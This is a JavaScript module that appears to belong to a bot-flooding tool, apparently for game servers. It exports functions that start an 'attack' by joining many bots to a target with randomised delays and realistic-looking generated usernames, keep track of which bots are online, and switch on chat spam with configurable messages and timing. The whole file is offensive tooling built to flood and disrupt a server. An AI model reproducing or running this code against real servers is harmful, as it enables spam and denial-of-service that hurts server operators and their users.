var attacks = {}
const util = require("./util.js")
const bot = require('./bot.js')

function stopAttack(id) {
    if (id in attacks) {
        for (let i = 0; i < attacks[id]["BotObjects"].length; i++) {
            attacks[id]["BotObjects"][i].quit();
            attacks[id]["BotObjects"][i].stopped = true;
        }
        delete attacks[id]["BotObjects"];
        delete attacks[id];
    }
}

function getOnlineBots(id) {
    var online = []
    if (id in attacks) {
        for (let i = 0; i < attacks[id]["BotObjects"].length; i++) {
            if (attacks[id]["BotObjects"][i].isOnline()) {
                online.push(attacks[id]["BotObjects"][i].username)
            };
        }
    }
    return online;
}


function stopSpam(id) {
    if (id in attacks) {
        for (let i = 0; i < attacks[id]["BotObjects"].length; i++) {
            attacks[id]["BotObjects"][i].stopSpam();
        }
    }
}

function startSpam(id) {
    if (id in attacks) {
        for (let i = 0; i < attacks[id]["BotObjects"].length; i++) {
            attacks[id]["BotObjects"][i].startSpam();
        }
    }
}

function setSpamDelay(id, min, max) {
    if (id in attacks) {
        for (let i = 0; i < attacks[id]["BotObjects"].length; i++) {
            attacks[id]["BotObjects"][i].setSpamDelay(min, max);
        }
    }
}

function setSpamMessage(id, message) {
    if (id in attacks) {
        for (let i = 0; i < attacks[id]["BotObjects"].length; i++) {
            attacks[id]["BotObjects"][i].setSpamMessage(message);
        }
    }
}

async function startAttack(bots, usernamemode, info, target, joindelaymin, joindelaymax, start, waitforothers) {
    const id = await util.randomString(12);
    attacks[id] = {"BotObjects": [],"BotUsernames": [], "Bots": bots, "Usernamemode": usernamemode, "Info": info, "Target": target, "Joindelaymin": joindelaymin, "Joindelaymax": joindelaymax, "Start": start, "ID": id, "Queue": 0}
    var botobjs = []

    for (let i = 0; i < bots; i++) {
        var username = ""
        while (attacks[id]["BotUsernames"].includes(username) || username=="") {
            if (usernamemode == "realistic") {
                username = await util.generateUsername_Realistic()
            }
            if (usernamemode == "random") {
                username = await util.generateUsername_Random()
            }
        }
        botobjs.push(new bot.Bot(username, target));
        attacks[id]["BotUsernames"].push(username)
    }
    attacks[id]["BotObjects"] = botobjs
    var delay = 0;
    for (let i = 0; i < attacks[id]["BotObjects"].length; i++) {
        if (waitforothers) {
            var tempv1 = setInterval(async function () {
                if (attacks[id]["Queue"] == 0) {
                    attacks[id]["Queue"] = 1
                    setTimeout(async function() {
                        attacks[id]["BotObjects"][i].join()
                        var tempv2 = setInterval(function() {
                            if (attacks[id]["BotObjects"][i].success == true) {
                                console.log("Joined!")
                                attacks[id]["Queue"] = 0
                                clearInterval(tempv1)
                                clearInterval(tempv2)
                                
                            }
                        }, 100)
                        
                    }, delay)
                }
                delay = util.getRandomNumber(joindelaymin, joindelaymax)
            }, 100)
            
        } else {
            setTimeout(async function() {
                try {
                    attacks[id]["BotObjects"][i].join()
                } catch (err) {}
                
            }, delay)
            delay += util.getRandomNumber(joindelaymin, joindelaymax)
        }
    }


    return {"id": id}
}

module.exports = {startAttack, stopAttack, stopSpam, startSpam, setSpamDelay, setSpamMessage, getOnlineBots}